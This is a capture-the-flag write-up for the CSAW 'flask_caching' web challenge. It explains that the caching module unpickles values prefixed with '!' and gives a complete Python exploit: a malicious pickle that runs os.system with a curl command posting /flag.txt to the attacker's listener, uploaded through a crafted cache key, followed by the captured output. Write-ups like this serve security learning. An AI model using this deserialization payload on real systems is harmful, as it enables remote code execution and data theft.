# flask_caching

Author: [roerohan](https://github.com/roerohan) and [thebongy](https://github.com/thebongy)

# Requirements

- Python

# Source

- [app.py](./app.py)

```
cache all the things (this is python3)

http://web.chal.csaw.io:5000
```

# Exploitation

```py
# app.py

from flask_caching import Cache
```

When you look at the documentation for the source for the `flask_caching` module, you can optionally store a python pickle in the redis by prepending it with `'!'`. You can use python pickles for RCE, when the caching modules uses `pickle.load()` to load the cached data.

Set up a netcat listener on your server and run the following script with your IP and PORT.

```py
import pickle
import sys
import base64
import requests
import time

IP = '0.0.0.0' # Your IP here
PORT = 8000
DEFAULT_COMMAND=f'curl -d "$(cat /flag.txt)" {IP}:{PORT}'
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

f = open('payload', 'wb')
f.write(b'!'+pickle.dumps(PickleRce()))
f.close()

time.sleep(0.5)

data = open('payload', 'rb').read()
print(data)
url = 'http://web.chal.csaw.io:5000/'

test = 'test23'

requests.post(url, files={ 'content': ('content', open('payload', 'rb').read()) }, data={ 'title': f'flask_cache_view//{test}' })

r = requests.get(url + test)
print(r.text)
```

On your netcat listener, you would get:

```
POST / HTTP/1.1
Host: yourhost:yourport
User-Agent: curl/7.69.1
Accept: */*
Content-Length: 16
Content-Type: application/x-www-form-urlencoded

flag{f1@sK_10rD}
```

The flag is:

```
flag{f1@sK_10rD}
```